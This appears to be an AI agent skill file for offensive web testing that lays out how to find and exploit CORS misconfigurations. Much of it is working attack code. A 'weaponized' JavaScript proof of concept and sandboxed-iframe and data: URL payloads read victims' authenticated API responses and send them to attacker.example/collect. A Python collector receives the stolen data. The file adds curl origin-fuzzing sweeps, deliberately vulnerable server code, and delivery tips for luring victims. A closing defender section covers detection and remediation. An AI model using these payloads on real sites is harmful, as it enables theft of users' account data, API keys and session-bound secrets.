---
name: offensive-cors
description: "CORS misconfiguration discovery and exploitation skill for offensive web assessments and bug bounty hunting. Covers Access-Control-Allow-Origin reflection combined with Access-Control-Allow-Credentials: true for credentialed cross-origin data theft, null origin abuse via sandboxed iframes and data: URLs, flawed origin-allowlist logic (unescaped regex dots, prefix startswith, suffix endswith, substring matches, example.com.attacker.example and attackerexample.com sibling tricks), trusting-all-subdomains then pivoting via subdomain XSS, insecure trust of http:// origins and scheme downgrade, and Vary: Origin cache poisoning of CORS headers. Includes probing methodology with curl Origin reflection checks, Burp Suite, and CORScanner, plus a weaponized fetch(url,{credentials:'include'}) JavaScript PoC that reads and exfiltrates cross-origin responses with preflight considerations. Use when testing cross-origin resource sharing headers, same-origin policy bypass, ACAO/ACAC relaxation, or stealing authenticated API data across origins."
---

# CORS Misconfiguration — Offensive Testing Methodology

Cross-Origin Resource Sharing (CORS) relaxes the same-origin policy so that a browser running one origin's JavaScript can read responses served by another origin. When a server reflects or over-trusts the request `Origin` header — especially while also returning `Access-Control-Allow-Credentials: true` — any page you control can make the victim's browser issue *credentialed* requests to the target and read the authenticated responses back. CORS bugs are distinct from CSRF: CSRF lets you *send* a request blind, CORS lets you *read* the reply, which turns a reflected origin into a full cross-origin data-theft primitive (API keys, CSRF tokens, PII, session-bound JSON). This skill is about finding the exact point where allowlist logic is wrong and weaponizing it into a browser-delivered exfiltration PoC.

## Quick Workflow

1. Enumerate every endpoint that returns interesting authenticated data as JSON/XML (account, profile, API, GraphQL, internal admin).
2. Replay each request adding `Origin: https://attacker.example` and inspect the response for `Access-Control-Allow-Origin` (ACAO) and `Access-Control-Allow-Credentials` (ACAC).
3. Classify the trust model: static origin, full reflection, `null` acceptance, or allowlist — then probe the allowlist logic for the specific flaw class (regex, prefix, suffix, substring).
4. Confirm credentials are actually in scope: does the endpoint rely on cookies/`Authorization`, and is ACAC `true`? Reflection *without* credentials is usually low-impact.
5. Build a browser PoC with `fetch(url,{credentials:'include'})`, account for preflight on non-simple requests, read the response, and exfiltrate it to a collector you control.
6. Assess cache interaction (`Vary: Origin` presence, CDN behavior) for poisoning and for PoC reliability.
7. Document the exact origin value that unlocks the read, the data exposed, and the corrected configuration.

---

## Background: What Makes a Response Readable

A cross-origin `fetch`/`XMLHttpRequest` *is sent* by the browser regardless of CORS. CORS only governs whether the calling script is allowed to **read** the response. Two headers decide this:

- `Access-Control-Allow-Origin` — must echo the exact requesting origin (or `*`) for the read to be permitted.
- `Access-Control-Allow-Credentials: true` — required for the browser to both *send* cookies/HTTP-auth on the cross-origin request **and** expose the response when credentials were included.

Hard rules the browser enforces (and that shape every attack):

- `Access-Control-Allow-Origin: *` **cannot** be combined with credentials. If the server sends `*` and `ACAC: true`, the browser rejects the read. Credentialed theft therefore requires the server to reflect a *specific* origin.
- With credentials, `Access-Control-Allow-Headers` and `Access-Control-Allow-Methods` also cannot be `*`; they must be explicit.
- Only ACAO/ACAC exposed by the server matter — you cannot forge them from the attacker page.

The whole game is making the server reflect **your** origin alongside `ACAC: true`.

---

## Probing Methodology

### Baseline curl Reflection Check

Fire the cheapest possible test first: does the server blindly reflect an arbitrary origin?

```bash
# Arbitrary external origin — the classic reflection bug
curl -s -I -H 'Origin: https://attacker.example' https://api.example.com/account \
  | grep -i 'access-control-'

# Expected smoking gun:
#   Access-Control-Allow-Origin: https://attacker.example
#   Access-Control-Allow-Credentials: true
```

If ACAO comes back equal to the value you injected, the origin is reflected. If `ACAC: true` is also present, you have a credentialed read primitive.

### Allowlist Logic Probes

When reflection is not blind, fuzz the matching logic. Each of these targets a specific implementation mistake:

```bash
TARGET=https://api.example.com/account

# 1. null origin (sandboxed iframe / data: URL / redirects)
curl -s -I -H 'Origin: null' "$TARGET" | grep -i access-control-

# 2. Suffix/endsWith check — attacker registers a sibling that ENDS in the trusted string
curl -s -I -H 'Origin: https://attackerexample.com' "$TARGET" | grep -i access-control-

# 3. Prefix/startsWith check — trusted string is a prefix of an attacker domain
curl -s -I -H 'Origin: https://example.com.attacker.example' "$TARGET" | grep -i access-control-

# 4. Substring/includes check — trusted brand appears anywhere
curl -s -I -H 'Origin: https://example.com.attacker.example' "$TARGET" | grep -i access-control-
curl -s -I -H 'Origin: https://attacker.example/example.com' "$TARGET" | grep -i access-control-

# 5. Unescaped dot in regex — the "." matches any char, so a hyphen/other char passes
curl -s -I -H 'Origin: https://exampleXcom.attacker.example' "$TARGET" | grep -i access-control-

# 6. Scheme downgrade — does it trust http:// as well as https://?
curl -s -I -H 'Origin: http://example.com' "$TARGET" | grep -i access-control-

# 7. Trusted-subdomain blanket — any subdomain accepted (sets up subdomain-XSS pivot)
curl -s -I -H 'Origin: https://anything.example.com' "$TARGET" | grep -i access-control-

# 8. Port confusion
curl -s -I -H 'Origin: https://example.com:1337' "$TARGET" | grep -i access-control-
```

Record, for each probe, whether ACAO reflects the injected value and whether ACAC is `true`. The combination tells you exactly which parser bug you're facing.

### Burp Suite Workflow

```
1. Proxy the authenticated session and locate JSON/data endpoints.
2. Send a target request to Repeater.
3. Add request header:  Origin: https://attacker.example
4. Send, read the response headers for Access-Control-Allow-Origin / -Credentials.
5. Use Intruder with an Origin wordlist (sibling, prefix, suffix, null, http) to
   sweep allowlist logic across many endpoints at once.
6. The "CORS additional checks" passive scan and the CORS* / Taborator extensions
   from the BApp Store flag reflected origins automatically.
```

### Automated Scanning

```bash
# CORScanner — fast reflection / misconfig detection across a host or list
corscanner -u https://api.example.com -v
corscanner -i hosts.txt -t 50

# Corsy — Python scanner that classifies the specific misconfiguration type
python3 corsy.py -u https://api.example.com \
  -headers "Cookie: session=<VALID_SESSION>"

# One-liner sweep over discovered URLs
cat urls.txt | while read u; do
  acao=$(curl -s -I -H 'Origin: https://attacker.example' "$u" \
    | grep -i 'access-control-allow-origin')
  [ -n "$acao" ] && echo "[+] $u -> $acao"
done
```

Always treat scanner output as a lead, not a finding — manually verify that credentials are in scope and that real sensitive data is returned.

---

## Reflected Origin + Credentials (The Core Bug)

The highest-impact pattern: the server copies the `Origin` request header straight into ACAO and sets `ACAC: true`.

Vulnerable server behavior:

```http
GET /api/account HTTP/1.1
Host: api.example.com
Origin: https://attacker.example
Cookie: session=<victim-cookie>

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://attacker.example
Access-Control-Allow-Credentials: true
Content-Type: application/json

{"email":"victim@example.com","apiKey":"sk_live_...","csrfToken":"..."}
```

Vulnerable backend code reflecting the origin verbatim:

```javascript
// Node/Express anti-pattern — reflects ANY origin
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', req.headers.origin); // reflects attacker
  res.header('Access-Control-Allow-Credentials', 'true');
  next();
});
```

```python
# Flask anti-pattern — echoes the Origin header back
@app.after_request
def add_cors(resp):
    resp.headers['Access-Control-Allow-Origin'] = request.headers.get('Origin', '*')
    resp.headers['Access-Control-Allow-Credentials'] = 'true'
    return resp
```

Because the browser *will* attach the victim's cookies (credentials included) and the server *will* authorize the read (ACAO echoes your origin, ACAC true), your page reads authenticated JSON belonging to the victim.

---

## `null` Origin Abuse

Browsers send `Origin: null` in several situations: sandboxed iframes, documents loaded from `data:` URLs, cross-origin redirects, and some `file://` contexts. Developers frequently add `null` to an allowlist for "local testing" and forget to remove it.

Vulnerable response:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

An attacker can *force* a `null` origin from a page they control by hosting the exfiltration script inside a sandboxed iframe or a `data:` URL, so the request the target sees carries `Origin: null`.

```html
<!-- Attacker page uses a sandboxed iframe to force Origin: null -->
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
        srcdoc="
  <script>
    fetch('https://api.example.com/api/account', {credentials:'include'})
      .then(r => r.text())
      .then(d => {
        fetch('https://attacker.example/collect', {method:'POST', body:d});
      });
  <\/script>">
</iframe>
```

```html
<!-- Alternative: a data: URL document also carries Origin: null -->
<iframe src="data:text/html,<script>
  fetch('https://api.example.com/api/account',{credentials:'include'})
    .then(r=>r.text())
    .then(d=>navigator.sendBeacon('https://attacker.example/collect', d));
</script>"></iframe>
```

`null` is never a safe allowlist entry — it is reachable by any attacker.

---

## Flawed Origin-Allowlist Logic

When the server validates the origin against a list, the comparison code is where bugs live. Register or control an origin that *passes the broken check* but resolves to infrastructure you own.

### Suffix / `endsWith` Match

Check: "does the origin end with `example.com`?" Attacker registers `attackerexample.com` — it ends with the trusted string.

```javascript
// VULNERABLE
if (origin.endsWith('example.com')) allow(origin);
// Passes for: https://attackerexample.com, https://notexample.com
```

```bash
curl -s -I -H 'Origin: https://attackerexample.com' https://api.example.com/account \
  | grep -i access-control-
```

### Prefix / `startsWith` Match

Check: "does the origin start with `https://example.com`?" Attacker uses `https://example.com.attacker.example`.

```javascript
// VULNERABLE
if (origin.startsWith('https://example.com')) allow(origin);
// Passes for: https://example.com.attacker.example
//             https://example.com.evil (subdomain of attacker-controlled TLD)
```

```bash
curl -s -I -H 'Origin: https://example.com.attacker.example' https://api.example.com/account \
  | grep -i access-control-
```

### Substring / `includes` / `indexOf` Match

Check: "does the origin contain `example.com`?" The brand string can appear anywhere.

```javascript
// VULNERABLE
if (origin.includes('example.com')) allow(origin);
// Passes for: https://example.com.attacker.example
//             https://attacker.example?x=example.com (where parsing is loose)
```

### Unescaped Dot in Regex

A regex meant to match `example\.com` but written as `example.com` — the `.` is a wildcard matching *any* character, so `exampleXcom`, `example-com`, etc. slip through.

```javascript
// VULNERABLE — dot is not escaped, ^/$ anchors missing
const re = /example.com/;            // '.' matches any char; no anchors
if (re.test(origin)) allow(origin);
// Passes for: https://exampleXcom.attacker.example
//             https://notexample-com.attacker.example
//             https://attacker.example/example9com

// Even with escaping, a missing end-anchor is fatal:
const re2 = /^https:\/\/example\.com/;   // no $  -> prefix match
// Passes for: https://example.com.attacker.example
```

```bash
curl -s -I -H 'Origin: https://exampleXcom.attacker.example' https://api.example.com/account \
  | grep -i access-control-
```

### Allowlist Flaw Quick Table

| ✓ Flaw | Vulnerable check | Attacker origin that passes |
|---|---|---|
| Blind reflection | `ACAO = Origin` | `https://attacker.example` |
| `null` in list | `origin === 'null'` allowed | `null` (sandbox iframe / `data:`) |
| Suffix | `origin.endsWith('example.com')` | `https://attackerexample.com` |
| Prefix | `origin.startsWith('https://example.com')` | `https://example.com.attacker.example` |
| Substring | `origin.includes('example.com')` | `https://example.com.attacker.example` |
| Unescaped dot | `/example.com/` | `https://exampleXcom.attacker.example` |
| No end anchor | `/^https:\/\/example\.com/` | `https://example.com.attacker.example` |
| Scheme downgrade | matches host, ignores scheme | `http://example.com` |
| Any subdomain | `*.example.com` trusted | `https://xss.example.com` (via subdomain XSS) |

---

## Trust-All-Subdomains → Subdomain XSS Pivot

A common "safe-looking" config trusts every subdomain of the primary domain:

```javascript
// Trusts all subdomains of example.com
if (/^https:\/\/([a-z0-9-]+\.)*example\.com$/.test(origin)) allow(origin);
```

This is only as strong as *every* subdomain. If any subdomain hosts an XSS, a stale/abandoned subdomain is takeover-able, or a dev/staging host serves attacker content, you win: run your exfiltration script *from* a trusted subdomain so the origin legitimately matches.

Attack chain:

1. Find an XSS (or subdomain takeover) on `sub.example.com`.
2. Host the CORS exfil payload there — the `Origin` is now `https://sub.example.com`, which the allowlist trusts.
3. The payload reads credentialed responses from `api.example.com` and ships them to you.

```javascript
// Injected via XSS on sub.example.com — origin is already trusted
fetch('https://api.example.com/api/account', {credentials:'include'})
  .then(r => r.text())
  .then(d => fetch('https://attacker.example/collect', {method:'POST', body:d}));
```

Chaining a low-severity subdomain XSS with a subdomain-trusting CORS policy routinely escalates both into a critical account-data disclosure. (See `offensive-xss` for finding the XSS, `offensive-open-redirect` for alternative origin control.)

---

## Insecure `http://` Trust & Scheme Downgrade

If the allowlist matches on host but ignores scheme, it will trust `http://example.com` as well as `https://example.com`. On any network where you can MITM plaintext HTTP (open Wi-Fi, ARP spoofing, rogue AP — see `offensive-network-attacks`), you:

1. Get the victim to load an `http://` page under an origin the policy trusts, or inject into any cleartext HTTP response.
2. Serve the credentialed-fetch payload from that `http://` origin.
3. The target returns `Access-Control-Allow-Origin: http://example.com` + `ACAC: true`, and you read HTTPS-protected data from a plaintext vantage point.

```bash
# Confirm the scheme-downgrade trust
curl -s -I -H 'Origin: http://example.com' https://api.example.com/account \
  | grep -i access-control-
# Access-Control-Allow-Origin: http://example.com  <-- scheme not validated
```

Trusting `http://` origins silently removes the transport-security guarantee of the whole API.

---

## Preflight Considerations

The browser sends a preflight `OPTIONS` request before any "non-simple" request. You must understand this to build a working PoC and to know when a bug is actually reachable.

A request is **simple** (no preflight) when it uses `GET`/`HEAD`/`POST`, only CORS-safelisted headers, and a `Content-Type` of `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain`. Anything else (custom headers like `Authorization` or `X-API-Key`, `Content-Type: application/json`, `PUT`/`DELETE`/`PATCH`) triggers a preflight.

```http
OPTIONS /api/account HTTP/1.1
Host: api.example.com
Origin: https://attacker.example
Access-Control-Request-Method: GET
Access-Control-Request-Headers: authorization

HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://attacker.example
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST, PUT
Access-Control-Allow-Headers: authorization, content-type
Access-Control-Max-Age: 86400
```

Practical implications:

- If the target data endpoint is a simple `GET` relying on **cookies**, no preflight occurs — the cleanest, most reliable CORS theft scenario.
- If reading requires a custom header (e.g., `Authorization` the attacker page cannot set to the victim's token), cookie-based auth is usually the viable path; token-in-header auth is often *not* exploitable via CORS because the attacker can't forge the victim's token.
- Misconfigured preflight responses that reflect `Access-Control-Request-Headers` back into `Access-Control-Allow-Headers` can widen what you can send.
- `Access-Control-Max-Age` caches the preflight, which can make repeated exfiltration faster but also makes misconfigurations stickier.

---

## Weaponized JavaScript PoC

Host this on the attacker origin that your probing proved is trusted (`attacker.example`, a sibling domain, a trusted subdomain via XSS, or inside a sandboxed iframe for `null`). It reads the victim's authenticated response and exfiltrates it.

```html
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>cors-poc</title></head>
<body>
<h1>Harmless-looking page</h1>
<script>
// Endpoint returning victim-authenticated data; cookie is attached by the browser.
const TARGET  = 'https://api.example.com/api/account';
const COLLECT = 'https://attacker.example/collect';

async function steal() {
  try {
    // credentials:'include' -> send cookies cross-origin; read allowed only if
    // the server reflects our origin AND sets Access-Control-Allow-Credentials: true
    const resp = await fetch(TARGET, {
      method: 'GET',
      credentials: 'include',      // the critical flag
      mode: 'cors'
    });
    const data = await resp.text(); // readable only when CORS authorizes it

    // Exfiltrate. POST is a "simple" request with text/plain, so no preflight here.
    await fetch(COLLECT, {
      method: 'POST',
      headers: {'Content-Type': 'text/plain'},
      body: data
    });

    // Fallback channel — survives page unload and some blockers.
    navigator.sendBeacon(COLLECT, data);
  } catch (e) {
    // A CORS read failure throws here -> the policy is NOT exploitable for this origin.
    navigator.sendBeacon(COLLECT + '?err=1', String(e));
  }
}
steal();
</script>
</body>
</html>
```

Minimal attacker-side collector for a lab/report:

```python
# collector.py — ONLY for authorized testing on infrastructure you control
from http.server import BaseHTTPRequestHandler, HTTPServer

class H(BaseHTTPRequestHandler):
    def _cors(self):
        self.send_header('Access-Control-Allow-Origin', '*')  # accept the beacon
    def do_POST(self):
        n = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(n)
        print(f"[+] exfil {len(body)} bytes from {self.client_address[0]}")
        print(body.decode('utf-8', 'replace'))
        self.send_response(200); self._cors(); self.end_headers()
    def do_OPTIONS(self):
        self.send_response(204); self._cors(); self.end_headers()

HTTPServer(('0.0.0.0', 8000), H).serve_forever()
```

Delivery: get the victim (while authenticated to the target) to open your page — a link, an ad, a comment embed, or a watering-hole on a page the target's users already visit. Keep the page visually innocuous so the victim lingers long enough for the fetch/beacon to complete.

---

## Caching Interaction & CORS Cache Poisoning

CORS headers are dynamic per-origin, so caching them incorrectly is its own vulnerability.

- **Missing `Vary: Origin`.** If a server reflects the origin into ACAO but the response is cacheable *without* `Vary: Origin`, a shared cache/CDN may store the ACAO value from one request and serve it to everyone. If an attacker's origin gets reflected and cached, later victims receive `Access-Control-Allow-Origin: https://attacker.example`, extending the window of exposure. Conversely a cached `ACAO: https://trusted.example` can break the app for others.

```bash
# Look for reflection WITHOUT Vary: Origin — poisoning candidate
curl -s -I -H 'Origin: https://attacker.example' https://api.example.com/data \
  | grep -iE 'access-control-allow-origin|vary|cache-control|age'
# ACAO reflected + no "Vary: Origin" + cacheable => investigate cache poisoning
```

- **Unkeyed `Origin` as a cache poisoning vector.** Where `Origin` influences a cached response body/headers but is not part of the cache key, you can poison the cache for other users. This overlaps with classic web cache poisoning (see `offensive-request-smuggling` and web-cache tradecraft).
- **PoC reliability.** Even when not exploitable for poisoning, cached preflights (`Access-Control-Max-Age`) and CDN behavior affect whether your PoC fetch succeeds consistently; test with cache-busting query params when validating.

Correct behavior is to always emit `Vary: Origin` whenever ACAO is derived from the request origin, and to keep credentialed CORS responses out of shared caches.

---

## Detection / Defender View

What defenders observe and how to catch this class:

- **Server/WAF logs:** cross-origin requests whose `Origin` header does not belong to the organization, especially bursts to data/API endpoints followed by `ACAO` echoing that foreign origin. Alert on responses where `Access-Control-Allow-Origin` equals an untrusted or externally-registered domain.
- **Reflection detection:** log and flag any response where `Access-Control-Allow-Origin` is *not* a member of a static known-good set. Reflection of arbitrary origins is the single strongest signal.
- **`null` and `http://`:** alert on `Access-Control-Allow-Origin: null` and on any `http://` origin being granted on an HTTPS API.
- **Beacon/exfil pattern:** authenticated JSON endpoint read cross-origin, immediately followed by an outbound `POST`/`sendBeacon` to an unrelated host from the same browser session.
- **Common evasions:** attackers use sibling domains (`attackerexample.com`), deep subdomains, and `null` via sandboxed iframes precisely to look like near-legitimate origins; match the *full* origin, not substrings.

### Correct Configuration (Remediation)

```javascript
// Strict allowlist — exact, full-origin equality; credentials only for known origins
const ALLOWED = new Set([
  'https://app.example.com',
  'https://admin.example.com'
]);

app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (origin && ALLOWED.has(origin)) {           // exact match, no regex games
    res.header('Access-Control-Allow-Origin', origin);
    res.header('Access-Control-Allow-Credentials', 'true');
    res.header('Vary', 'Origin');                // never cache the wrong ACAO
  }
  // No match => emit NO ACAO at all (browser blocks the read). Never fall back to *.
  next();
});
```

Defender checklist:

- ✓ Match the **entire** origin against an exact allowlist; never `startsWith`/`endsWith`/`includes`/loose regex.
- ✓ If you must regex, escape dots and anchor with `^...$`.
- ✓ Never reflect arbitrary origins; never return `Access-Control-Allow-Origin: *` on endpoints that serve authenticated data.
- ✓ Never put `null` in the allowlist.
- ✓ Require `https://` origins; reject scheme downgrades.
- ✓ Only set `Access-Control-Allow-Credentials: true` for the exact origins that truly need it.
- ✓ Always send `Vary: Origin` when ACAO is dynamic; keep credentialed responses out of shared caches.
- ✗ Do not trust every subdomain unless every subdomain is held to the same security bar (no stale hosts, no XSS).

---

## Engagement Cheatsheet

```bash
# 1) Blind reflection check
curl -s -I -H 'Origin: https://attacker.example' https://api.example.com/account | grep -i access-control-

# 2) Allowlist logic sweep
for o in \
  'null' \
  'https://attackerexample.com' \
  'https://example.com.attacker.example' \
  'https://exampleXcom.attacker.example' \
  'http://example.com' \
  'https://sub.example.com' ; do
  echo "== Origin: $o =="
  curl -s -I -H "Origin: $o" https://api.example.com/account | grep -i access-control-
done

# 3) Preflight behavior
curl -s -I -X OPTIONS -H 'Origin: https://attacker.example' \
  -H 'Access-Control-Request-Method: GET' \
  -H 'Access-Control-Request-Headers: authorization' \
  https://api.example.com/account | grep -i access-control-

# 4) Cache poisoning candidate (reflection without Vary: Origin)
curl -s -I -H 'Origin: https://attacker.example' https://api.example.com/data \
  | grep -iE 'access-control-allow-origin|vary|cache-control|age'

# 5) Automated classification
python3 corsy.py -u https://api.example.com -headers "Cookie: session=<SESSION>"
corscanner -u https://api.example.com -v
```

Triage logic:

1. ACAO reflects your origin **and** ACAC `true` → credentialed read. Build the `fetch(...,{credentials:'include'})` PoC. **High/Critical.**
2. ACAO reflects but **no** ACAC / endpoint has no credentials → confirm whether any sensitive unauthenticated data is exposed; usually Low–Medium.
3. `null` accepted with ACAC → force `null` via sandboxed iframe / `data:`. High.
4. Only a broken allowlist (prefix/suffix/substring/regex) passes → register/stand up the matching origin, then PoC. Impact tracks the data behind it.
5. Trust-all-subdomains → look for a subdomain XSS/takeover to supply a trusted origin.

---

## Key References

- PortSwigger Web Security Academy — Cross-origin resource sharing (CORS): https://portswigger.net/web-security/cors
- PortSwigger — Exploiting CORS misconfigurations for Bitcoins and bounties (James Kettle): https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties
- OWASP — CORS OriginHeaderScrutiny / Testing Cross Origin Resource Sharing (WSTG-CLNT-07): https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing
- OWASP Cheat Sheet — HTML5 Security (CORS section): https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html
- CWE-942: Permissive Cross-domain Policy with Untrusted Domains — https://cwe.mitre.org/data/definitions/942.html
- CWE-346: Origin Validation Error — https://cwe.mitre.org/data/definitions/346.html
- MDN — Cross-Origin Resource Sharing (CORS): https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS
- W3C/Fetch Standard — CORS protocol: https://fetch.spec.whatwg.org/#http-cors-protocol
- Tooling — CORScanner: https://github.com/chenjj/CORScanner ; Corsy: https://github.com/s0md3v/Corsy
- MITRE ATT&CK: T1190 (Exploit Public-Facing Application)
